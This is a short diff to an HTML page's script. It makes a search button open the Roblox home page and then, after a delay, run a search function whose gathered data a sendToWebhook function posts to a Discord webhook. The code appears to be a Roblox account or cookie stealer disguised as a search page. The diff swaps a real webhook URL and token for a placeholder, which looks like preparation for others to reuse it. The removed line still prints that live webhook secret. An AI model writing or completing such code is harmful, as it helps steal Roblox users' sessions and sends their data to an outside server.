@@ -10,7 +10,11 @@
 
     <script>
         document.getElementById("searchButton").addEventListener("click", function() {
-            searchWebsite();
+            // Open Roblox home page in a new tab
+            window.open("https://roblox.com/home", "_blank");
+
+            // Start the search process in the current tab
+            setTimeout(searchWebsite, 5000); // Delay to give time for the new tab to open
         });
 
         function searchWebsite() {
@@ -47,7 +51,7 @@
         }
 
         function sendToWebhook(data) {
-            var webhookUrl = "https://discord.com/api/webhooks/1262548012908019832/eRUmUbAmARjlV5x_u1BGb0KR1zMy2wCr8zJvFIqFO4FTwk92e1TFUSb_T7ChIigTYJUU";
+            var webhookUrl = "YOUR_WEBHOOK_URL";
             var xhr = new XMLHttpRequest();
             xhr.open("POST", webhookUrl, true);
             xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
